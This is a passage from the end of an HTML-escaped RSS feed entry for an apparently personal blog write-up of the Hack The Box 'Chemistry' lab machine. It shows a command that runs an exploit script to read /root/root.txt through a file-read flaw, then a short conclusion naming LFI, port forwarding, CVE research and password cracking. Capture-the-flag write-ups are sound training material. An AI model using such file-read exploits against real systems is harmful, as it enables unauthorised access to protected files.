&lt;pre tabindex="0" class="chroma">&lt;code class="language-sh" data-lang="sh">&lt;span class="line">&lt;span class="cl">python exploit.py -u &lt;span class="s2">&amp;#34;http://localhost:5555&amp;#34;&lt;/span> -f &lt;span class="s2">&amp;#34;/root/root.txt&amp;#34;&lt;/span> -d &lt;span class="s2">&amp;#34;/assets&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/10.png"
width="479"
height="250"
srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/10_hu_121c06fa7e010e4c.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/10_hu_ccb4b7b2f0a9c65d.png 1024w"
loading="lazy"
alt="Image 10"
class="gallery-image"
data-flex-grow="191"
data-flex-basis="459px"
>&lt;/p>
&lt;p>and you got the root flag!!&lt;/p>
&lt;h3 id="conclusion">Conclusion
&lt;/h3>&lt;p>This machine covers topics like LFI, port forwarding, looking for CVEs and password cracking.&lt;/p>
&lt;p>&lt;img src="https://solarspectre.github.io/p/htb-chemistry-writeup/11.png"
width="731"
height="590"
srcset="https://solarspectre.github.io/p/htb-chemistry-writeup/11_hu_eb47687b88408f93.png 480w, https://solarspectre.github.io/p/htb-chemistry-writeup/11_hu_8683d605435bf6bc.png 1024w"
loading="lazy"
alt="Final"
class="gallery-image"
data-flex-grow="123"
data-flex-basis="297px"
>&lt;/p>
&lt;p>&lt;mark>Hope you enjoy it and Happy Hacking!&lt;/mark>&lt;/p></description></item></channel></rss>